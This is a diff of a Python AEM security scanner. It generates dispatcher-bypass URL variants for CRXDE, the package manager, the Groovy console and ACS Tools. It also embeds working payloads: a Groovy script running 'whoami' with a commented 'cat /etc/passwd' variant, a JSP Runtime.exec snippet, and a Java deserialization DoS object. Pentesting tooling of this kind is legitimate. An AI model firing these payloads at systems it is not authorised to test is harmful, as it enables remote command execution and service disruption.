-    )
-    CRXDELITE = list('{0}{1}'.format(p1, p2) for p1, p2 in CRXDELITE)
+    r = random_string(3)
 
-    CRX = itertools.product(
-        ('/crx/explorer/browser/index.jsp', '///crx///explorer///browser///index.jsp'),
-        ('', ';%0aa.css', ';%0aa.html', ';%0aa.js', ';%0aa.ico', ';%0aa.png', '?a.css', '?a.html', '?a.png', '?a.js', '?a.ico')
-    )
-    CRX = list('{0}{1}'.format(p1, p2) for p1, p2 in CRX)
+    CRXDELITE = itertools.product(('/crx/de/index.jsp', '///crx///de///index.jsp'),
+                                  ('', ';%0a{0}.css', ';%0a{0}.html', ';%0a{0}.js', ';%0a{0}.ico', '?{0}.css',
+                                   '?{0}.html', '?{0}.ico'))
+    CRXDELITE = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in CRXDELITE)
 
-    CRXSEARCH = itertools.product(
-        ('/crx/explorer/ui/search.jsp', '/crx///explorer///ui///search.jsp'),
-        ('', ';%0aa.css', ';%0aa.html', ';%0aa.js', ';%0aa.ico', ';%0aa.png', '?a.css', '?a.html', '?a.png', '?a.js', '?a.ico')
-    )
-    CRXSEARCH = list('{0}{1}'.format(p1, p2) for p1, p2 in CRXSEARCH)
+    CRX = itertools.product(('/crx/explorer/browser/index.jsp', '///crx///explorer///browser///index.jsp'),
+                            ('', ';%0a{0}.css', ';%0a{0}.html', ';%0a{0}.ico', '?{0}.css',
+                             '?{0}.html', '?{0}.ico'))
+    CRX = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in CRX)
 
-    CRXNAMESPACE = itertools.product(
-        ('/crx/explorer/ui/namespace_editor.jsp', '///crx/explorer///ui///namespace_editor.jsp'),
-        ('', ';%0aa.css', ';%0aa.html', ';%0aa.js', ';%0aa.ico', ';%0aa.png', '?a.css', '?a.html', '?a.png', '?a.js', '?a.ico')
+    CRXSEARCH = itertools.product(('/crx/explorer/ui/search.jsp', '/crx///explorer///ui///search.jsp'),
+                                  ('', ';%0a{0}.css', ';%0a{0}.html', ';%0a{0}.ico',
+                                   '?{0}.css', '?{0}.html', '?{0}.ico'))
+    CRXSEARCH = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in CRXSEARCH)
+
+    CRXNAMESPACE = itertools.product(('/crx/explorer/ui/namespace_editor.jsp', '///crx/explorer///ui///namespace_editor.jsp'),
+                                     ('', ';%0a{0}.css', ';%0a{0}.html', ';%0a{0}.ico', '?{0}.css',
+                                      '?{0}.html', '?{0}.ico')
     )
-    CRXNAMESPACE = list('{0}{1}'.format(p1, p2) for p1, p2 in CRXNAMESPACE)
+    CRXNAMESPACE = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in CRXNAMESPACE)
 
 
-    PACKMGR = itertools.product(
-        ('/crx/packmgr/index.jsp', '///crx///packmgr///index.jsp'),
-        ('', ';%0aa.css', ';%0aa.html', ';%0aa.js', ';%0aa.ico', ';%0aa.png', '?a.css', '?a.html', '?a.png', '?a.js', '?a.ico')
+    PACKMGR = itertools.product(('/crx/packmgr/index.jsp', '///crx///packmgr///index.jsp'),
+                                ('', ';%0a{0}.css', ';%0a{0}.html', ';%0a{0}.ico',
+                                 '?{0}.css', '?{0}.html', '?{0}.ico')
     )
-    PACKMGR = list('{0}{1}'.format(p1, p2) for p1, p2 in PACKMGR)
+    PACKMGR = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in PACKMGR)
 
     results = []
     for path in itertools.chain(CRXDELITE, CRX, CRXSEARCH, CRXNAMESPACE, PACKMGR):
@@ -713,13 +831,13 @@ def exposed_crxde_crx(base_url, my_host, debug=False, proxy=None):
     return results
 
 
-@register
+#@register
 def exposed_reports(base_url, my_host, debug=False, proxy=None):
-    DISKUSAGE = itertools.product(
-        ('/etc/reports/diskusage.html', '///etc/reports///diskusage.html'),
-        ('')
-    )
-    DISKUSAGE = list('{0}{1}'.format(p1,p2) for p1, p2 in DISKUSAGE)
+    r = random_string(3)
+
+    DISKUSAGE = itertools.product(('/etc/reports/diskusage.html', '///etc/reports///diskusage.html'),
+                                  ('/{0}.css', '/{0}.ico', ';%0a{0}.css', ';%0a{0}.ico'))
+    DISKUSAGE = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in DISKUSAGE)
 
     results = []
     for path in DISKUSAGE:
@@ -1270,12 +1388,14 @@ def swf_xss(base_url, my_host, debug=False, proxy=None):
 
 @register
 def deser_externaljob_servlet(base_url, my_host, debug=False, proxy=None):
+    r = random_string(3)
+
     DESERPAYLOAD = base64.b64decode('rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c=')  # Generated with oisdos - java -Xmx25g -jar target/oisdos-1.0.jar ObjectArrayHeap
 
     EXTERNALJOBSERVLET = itertools.product(('/libs/dam/cloud/proxy', '///libs///dam///cloud///proxy'),
                                            ('.json', '.css', '.js', '.html', '.ico', '.png', '.gif', '.1.json',
-                                            '.4.2.1...json', '.json;%0aa.css', '.json;%0aa.html', '.json;%0aa.ico'))
-    EXTERNALJOBSERVLET = list('{0}{1}'.format(p1, p2) for p1, p2 in EXTERNALJOBSERVLET)
+                                            '...4.2.1...json', '.json;%0a{0}.css', '.json;%0a{0}.html', '.json;%0a{0}.ico'))
+    EXTERNALJOBSERVLET = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in EXTERNALJOBSERVLET)
 
 
     results = []
@@ -1302,11 +1422,13 @@ def deser_externaljob_servlet(base_url, my_host, debug=False, proxy=None):
 
 @register
 def exposed_webdav(base_url, my_host, debug=False, proxy=None):
-    WEBDAV = itertools.product(('/crx/repository/test.sh', ),
-                                           ('', '.json', '.css', '.js', '.html', '.ico', '.png', '.gif',
-                                            ';%0aa.css', ';%0aa.js', ';%0aa.html', ';%0aa.ico', ';%0aa.png',
-                                            '/a.css', '/a.html', '/a.js', '/a.ico', '/a.png', '/a.ico'))
-    WEBDAV = list('{0}{1}'.format(p1, p2) for p1, p2 in WEBDAV)
+    r = random_string(3)
+
+    WEBDAV = itertools.product(('/crx/repository/test', ),
+                               ('', '.json', '.css', '.html', '.ico',
+                                ';%0a{0}.css', ';%0a{0}.html', ';%0a{0}.ico',
+                                '/{0}.css', '/{0}.html', '/{0}.ico'))
+    WEBDAV = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in WEBDAV)
 
     results = []
     for path in WEBDAV:
@@ -1332,28 +1454,24 @@ def exposed_webdav(base_url, my_host, debug=False, proxy=None):
 
 @register
 def exposed_groovy_console(base_url, my_host, debug=False, proxy=None):
+    r = random_string(3)
+
     SCRIPT = 'def%20command%20%3D%20%22whoami%22%0D%0Adef%20proc%20%3D%20command.execute%28%29%0D%0Aproc.waitFor%28%29%0D%0Aprintln%20%22%24%7Bproc.in.text%7D%22'  # 'def+proc+%3d+"cat+/etc/passwd".execute()%0d%0aprintln+proc.text'
 
-    GROOVYSCRIPT1 = itertools.product(
-        ('/bin/groovyconsole/post.servlet', '///bin///groovyconsole///post.servlet'),
-        ('', '.css', '.js', '.html', '.ico', '.png', '.json', '.1.json', '.4.2.1...json', ';%0aa.css', ';%0aa.html',
-         ';%0aa.js', ';%0aa.ico', ';%0aa.png')
-    )
-    GROOVYSCRIPT1 = list('{0}{1}'.format(p1, p2) for p1, p2 in GROOVYSCRIPT1)
+    GROOVYSCRIPT1 = itertools.product(('/bin/groovyconsole/post.servlet', '///bin///groovyconsole///post.servlet'),
+                                      ('', '.css', '.html', '.ico', '.json', '.1.json', '...4.2.1...json', ';%0a{0}.css',
+                                       ';%0a{0}.html', ';%0a{0}.ico'))
+    GROOVYSCRIPT1 = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in GROOVYSCRIPT1)
 
-    GROOVYSCRIPT2 = itertools.product(
-        ('/etc/groovyconsole/jcr:content.html', '///etc///groovyconsole///jcr:content.html'),
-        ('', '/a.css', '/a.js', '/a.html', '/a.ico', '/a.png', '/a.1.json', '/a.4.2.1...json', ';%0aa.css', ';%0aa.html',
-         ';%0aa.js', ';%0aa.ico', ';%0aa.png')
-    )
-    GROOVYSCRIPT2 = list('{0}{1}'.format(p1, p2) for p1, p2 in GROOVYSCRIPT2)
+    GROOVYSCRIPT2 = itertools.product(('/etc/groovyconsole/jcr:content.html', '///etc///groovyconsole///jcr:content.html'),
+                                      ('', '/{0}.css', '/{0}.html', '/{0}.ico', '/{0}.1.json', '/{0}...4.2.1...json',
+                                       ';%0a{0}.css', ';%0a{0}.html', ';%0a{0}.ico'))
+    GROOVYSCRIPT2 = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in GROOVYSCRIPT2)
 
-    GROOVYAUDIT = itertools.product(
-        ('/bin/groovyconsole/audit.servlet', '///bin///groovyconsole///audit.servlet'),
-        ('', '.css', '.js', '.html', '.ico', '.png', '.json', '.1.json', '.4.2.1...json', ';%0aa.css', ';%0aa.html',
-         ';%0aa.js', ';%0aa.ico', ';%0aa.png')
-    )
-    GROOVYAUDIT = list('{0}{1}'.format(p1, p2) for p1, p2 in GROOVYAUDIT)
+    GROOVYAUDIT = itertools.product(('/bin/groovyconsole/audit.servlet', '///bin///groovyconsole///audit.servlet'),
+                                    ('', '.css', '.js', '.html', '.ico', '.png', '.json', '.1.json', '...4.2.1...json',
+                                     ';%0a{0}.css', ';%0a{0}.html', ';%0a{0}.ico'))
+    GROOVYAUDIT = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in GROOVYAUDIT)
 
     results = []
     for path in itertools.chain(GROOVYSCRIPT1, GROOVYSCRIPT2):
@@ -1408,14 +1526,14 @@ def exposed_groovy_console(base_url, my_host, debug=False, proxy=None):
 
 @register
 def exposed_acs_tools(base_url, my_host, debug=False, proxy=None):
+    r = random_string(3)
+
     DATA = 'scriptdata=%0A%3C%25%40+page+import%3D%22java.io.*%22+%25%3E%0A%3C%25+%0A%09Process+proc+%3D+Runtime.getRuntime().exec(%22echo+abcdef31337%22)%3B%0A%09%0A%09BufferedReader+stdInput+%3D+new+BufferedReader(new+InputStreamReader(proc.getInputStream()))%3B%0A%09StringBuilder+sb+%3D+new+StringBuilder()%3B%0A%09String+s+%3D+null%3B%0A%09while+((s+%3D+stdInput.readLine())+!%3D+null)+%7B%0A%09%09sb.append(s+%2B+%22%5C%5C%5C%5Cn%22)%3B%0A%09%7D%0A%09%0A%09String+output+%3D+sb.toString()%3B%0A%25%3E%0A%3C%25%3Doutput+%25%3E&scriptext=jsp&resource='
 
     FIDDLE = itertools.product(
-        ('/etc/acs-tools/aem-fiddle/_jcr_content.run.html', '/etc/acs-tools/aem-fiddle/_jcr_content.run.4.2.1...html'),
-        ('', '/a.css', '/a.js', '/a.ico', '/a.png', '/a.json', '/a.1.json', '/a.4.2.1...json', '?a.css', '?a.gif',
-         '?a.js', '?a.ico', '?a.png')
-    )
-    FIDDLE = list('{0}{1}'.format(p1, p2) for p1, p2 in FIDDLE)
+        ('/etc/acs-tools/aem-fiddle/_jcr_content.run.html', '/etc/acs-tools/aem-fiddle/_jcr_content.run...4.2.1...html'),
+        ('', '/{0}.css', '/{0}.ico', '/a.png', '/{0}.json', '/{0}.1.json', '?{0}.css', '?{0}.ico'))
+    FIDDLE = list('{0}{1}'.format(p1, p2.format(r)) for p1, p2 in FIDDLE)
 
     PREDICATES = ('/bin/acs-tools/qe/predicates.json',)
 
@@ -1475,6 +1593,7 @@ def run_detector(port):  # Run SSRF detector in separate thread
     httpd = HTTPServer(('', port), handler)
 
     t = Thread(target=httpd.serve_forever)
+    t.daemon = True
     t.start()
 
     return httpd
